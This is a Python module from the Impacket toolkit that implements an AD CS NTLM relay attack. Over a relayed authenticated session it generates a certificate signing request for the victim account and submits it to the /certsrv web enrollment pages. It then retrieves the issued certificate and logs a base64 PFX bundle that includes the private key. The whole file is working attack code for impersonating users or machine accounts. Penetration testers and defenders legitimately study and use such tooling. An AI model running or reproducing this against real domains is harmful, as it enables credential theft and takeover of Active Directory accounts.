# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   AD CS relay attack
#
# Authors:
#   Ex Android Dev (@ExAndroidDev)
#   Tw1sm (@Tw1sm)

import re
import base64
from OpenSSL import crypto

from impacket import LOG

# cache already attacked clients
ELEVATED = []


class ADCSAttack:

    def _run(self):
        key = crypto.PKey()
        key.generate_key(crypto.TYPE_RSA, 4096)

        if self.username in ELEVATED:
            LOG.info('Skipping user %s since attack was already performed' % self.username)
            return

        current_template = self.config.template
        if current_template is None:
            current_template = "Machine" if self.username.endswith("$") else "User"

        csr = self.generate_csr(key, self.username)
        csr = csr.decode().replace("\n", "").replace("+", "%2b").replace(" ", "+")
        LOG.info("CSR generated!")

        data = "Mode=newreq&CertRequest=%s&CertAttrib=CertificateTemplate:%s&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=" % (csr, current_template)

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": len(data)
        }

        LOG.info("Getting certificate...")

        self.client.request("POST", "/certsrv/certfnsh.asp", body=data, headers=headers)
        ELEVATED.append(self.username)
        response = self.client.getresponse()

        if response.status != 200:
            LOG.error("Error getting certificate! Make sure you have entered valid certiface template.")
            return

        content = response.read()
        found = re.findall(r'location="certnew.cer\?ReqID=(.*?)&', content.decode())
        if len(found) == 0:
            LOG.error("Error obtaining certificate!")
            return

        certificate_id = found[0]

        self.client.request("GET", "/certsrv/certnew.cer?ReqID=" + certificate_id)
        response = self.client.getresponse()

        LOG.info("GOT CERTIFICATE! ID %s" % certificate_id)
        certificate = response.read().decode()

        certificate_store = self.generate_pfx(key, certificate)
        LOG.info("Base64 certificate of user %s: \n%s" % (self.username, base64.b64encode(certificate_store).decode()))

    def generate_csr(self, key, CN):
        LOG.info("Generating CSR...")
        req = crypto.X509Req()
        req.get_subject().CN = CN
        req.set_pubkey(key)
        req.sign(key, "sha256")

        return crypto.dump_certificate_request(crypto.FILETYPE_PEM, req)

    def generate_pfx(self, key, certificate):
        certificate = crypto.load_certificate(crypto.FILETYPE_PEM, certificate)
        p12 = crypto.PKCS12()
        p12.set_certificate(certificate)
        p12.set_privatekey(key)
        return p12.export()
